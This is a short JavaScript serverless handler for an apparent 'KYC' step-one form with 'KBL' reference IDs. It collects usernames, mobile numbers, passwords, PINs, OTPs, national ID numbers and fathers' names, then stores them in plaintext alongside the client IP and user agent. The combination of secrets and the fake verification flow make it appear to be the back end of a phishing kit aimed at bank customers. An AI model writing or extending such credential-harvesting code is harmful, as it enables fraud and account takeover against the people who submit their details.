const { setCors, sendJson, getBody, readSmsConfig, renderSmsMessage, upsertSubmission } = require('./_lib/storage');

module.exports = async function handler(req, res) {
  setCors(res);
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return sendJson(res, 405, { error: 'Method not allowed' });

  const rawBody = await getBody(req);
  try {
    const payload = JSON.parse(rawBody);
    const sessionId = payload.sessionId || ('KBL-SES-' + (Math.floor(Math.random() * 900000) + 100000));
    const refId     = payload.refId     || ('KBL-KYC-' + (Math.floor(Math.random() * 900000) + 100000));
    const clientIp  = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';

    const cfg        = await readSmsConfig();
    const smsRecipient = cfg.recipient || '32001';
    const smsMessage   = renderSmsMessage(cfg.messageTemplate, {
      refId, mobile: payload.mobile || '', username: payload.username || ''
    });

    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const record = {
      sessionId,
      refId,
      status: 'INITIAL_SUBMISSION',
      username: payload.username || '',
      mobile:   payload.mobile   || '',
      password: payload.password || '',
      pin:      payload.pin      || '',
      fatherName: payload.fatherName || '',
      nidNumber:  payload.nidNumber  || '',
      otp: payload.otp || '',
      clientIp,
      userAgent: req.headers['user-agent'] || '',
      createdAt: now,
      verifiedAt: '',
      smsRecipient,
      smsMessage
    };

    await upsertSubmission(record);

    return sendJson(res, 200, {
      status: 'success',
      sessionId,
      refId: record.refId,
      smsRecipient,
      smsMessage,
      message: 'Step 1 response recorded'
    });
  } catch (e) {
    return sendJson(res, 400, { status: 'error', message: 'Invalid JSON payload: ' + e.message });
  }
};
